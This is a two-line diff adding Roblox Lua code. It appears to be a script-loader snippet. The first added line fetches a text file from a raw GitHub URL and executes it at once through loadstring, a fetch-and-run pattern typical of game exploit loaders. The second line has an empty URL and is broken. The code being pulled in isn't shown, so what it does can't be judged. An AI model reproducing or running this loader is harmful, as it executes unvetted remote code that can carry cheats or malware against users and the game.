@@ -1,1 +1,2 @@
- 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/mpaio58a/Idk/refs/heads/main/Alpha_Script.txt"))()
+loadstring(game:HttpGet(""))() 
